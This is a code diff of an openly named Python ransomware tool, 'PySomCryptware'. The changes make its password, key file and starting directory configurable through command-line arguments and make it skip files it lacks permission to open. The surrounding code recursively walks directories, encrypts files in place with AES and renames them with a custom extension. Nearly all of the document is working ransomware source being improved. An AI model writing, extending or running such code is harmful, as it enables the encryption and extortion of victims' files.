@@ -29,7 +29,7 @@ class PySomCryptware:
     needed.
     """
 
-    def __init__(self, password=None, keyfile=None) -> None:
+    def __init__(self, password, keyfile, start_path) -> None:
         """
         Initialize an instance of the PySomCryptware class
         @param password: password that will be used during symmetric key generation. Default is 'rans0mwar3CanB3Fun'. 
@@ -38,20 +38,17 @@ class PySomCryptware:
         @return: None
         """
         # password or passphrase to be hashed during generation of a symmetric key for AES encryption.
-        if password is None:
-            self.password = "rans0mwar3CanB3Fun"
-        else:
-            self.password = password
+        self.password = password
 
-        if keyfile is None:
-            self.keyfile = "pysomkey.key"
-        else:
-            self.keyfile = keyfile
+        self.keyfile = keyfile
 
         # Python set of file extensions to avoid during encryption( You can add yours )
         self.blacklist_exts = {
             "py", "pyc", "key", 'dll', 'so', 'a', 'lib', 'o'
         }
+
+        # starting directory while crypting
+        self.start_path = start_path
 
         # custom file extension for encrypted files
         self.enc_file_ext = ".pysomcryptware"
@@ -114,7 +111,7 @@ class PySomCryptware:
         with open(self.keyfile, "wb") as fh:
             fh.write(self.key)
 
-    def start_crypting(self, start_path, encryption=True):
+    def start_crypting(self, encryption=True):
         """
         Encrypt or decrypt files from start_path recursively while skipping over
         the blacklisted files
@@ -122,7 +119,7 @@ class PySomCryptware:
         join_fpaths = os.path.join
 
         curr_script_path = abspath(__file__)
-        for root, _, files in os.walk(start_path):
+        for root, _, files in os.walk(self.start_path):
             for each_file in files:
                 abs_fpath = abspath(join_fpaths(root, each_file))
 
@@ -173,7 +170,14 @@ class PySomCryptware:
         """
         Encrypts/Decrypts a file in-place
         """
-        with open(fpath, "rb+") as fh:
+        try:
+            fh = open(fpath, "rb+")
+        except PermissionError:
+            print(
+                f"{colorama.Fore.RED}[-] Insufficient file permissions. Skipping file: '{fpath}'"
+            )
+            return
+        else:
             in_data, out_data = (b'', b'')
 
             if encryption:  # encrypt file data
@@ -207,6 +211,8 @@ class PySomCryptware:
             fh.seek(0)
             fh.write(out_data)
             _ = fh.truncate()  # it's necessary! Don't touch plz!
+        finally:
+            fh.close()
 
 
 def get_cmdline_args():
@@ -227,8 +233,23 @@ def get_cmdline_args():
     parser.add_argument(
         "-k",
         "--keyfile",
+        default="pysomkey.key",
         help=
         "File where the symmetric key is stored. Set to 'pysomkey.key' by default.",
+    )
+    parser.add_argument(
+        "-p",
+        "--password",
+        default="rans0mwar3CanB3Fun",
+        help=
+        "Password used to encrypt/decrypt the locked files. Set to 'rans0mwar3CanB3Fun' by default.",
+    )
+    parser.add_argument(
+        "-s",
+        "--startdir",
+        default=".",
+        help=
+        "Directory path where to start when encrypting/decrypting files. Set to '.' by default.",
     )
 
     return vars(parser.parse_args())
